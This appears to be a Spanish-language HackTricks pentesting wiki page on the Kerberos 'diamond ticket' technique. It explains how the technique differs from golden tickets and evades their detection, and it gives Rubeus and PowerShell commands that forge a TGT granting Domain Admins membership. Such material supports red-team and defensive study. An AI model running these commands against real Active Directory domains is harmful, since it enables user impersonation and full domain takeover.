# Diamond Ticket

{{#include ../../banners/hacktricks-training.md}}

## Diamond Ticket

**Como un ticket dorado**, un ticket de diamante es un TGT que se puede usar para **acceder a cualquier servicio como cualquier usuario**. Un ticket dorado se forja completamente fuera de línea, se cifra con el hash krbtgt de ese dominio y luego se pasa a una sesión de inicio de sesión para su uso. Debido a que los controladores de dominio no rastrean los TGT que (o ellos) han emitido legítimamente, aceptarán felizmente los TGT que están cifrados con su propio hash krbtgt.

Hay dos técnicas comunes para detectar el uso de tickets dorados:

- Buscar TGS-REQs que no tengan un AS-REQ correspondiente.
- Buscar TGTs que tengan valores absurdos, como la vida útil predeterminada de 10 años de Mimikatz.

Un **ticket de diamante** se crea **modificando los campos de un TGT legítimo que fue emitido por un DC**. Esto se logra **solicitando** un **TGT**, **descifrándolo** con el hash krbtgt del dominio, **modificando** los campos deseados del ticket y luego **volviéndolo a cifrar**. Esto **supera las dos desventajas mencionadas anteriormente** de un ticket dorado porque:

- Los TGS-REQs tendrán un AS-REQ anterior.
- El TGT fue emitido por un DC, lo que significa que tendrá todos los detalles correctos de la política Kerberos del dominio. Aunque estos pueden ser forjados con precisión en un ticket dorado, es más complejo y propenso a errores.
```bash
# Get user RID
powershell Get-DomainUser -Identity <username> -Properties objectsid

.\Rubeus.exe diamond /tgtdeleg /ticketuser:<username> /ticketuserid:<RID of username> /groups:512

# /tgtdeleg uses the Kerberos GSS-API to obtain a useable TGT for the user without needing to know their password, NTLM/AES hash, or elevation on the host.
# /ticketuser is the username of the principal to impersonate.
# /ticketuserid is the domain RID of that principal.
# /groups are the desired group RIDs (512 being Domain Admins).
# /krbkey is the krbtgt AES256 hash.
```
{{#include ../../banners/hacktricks-training.md}}
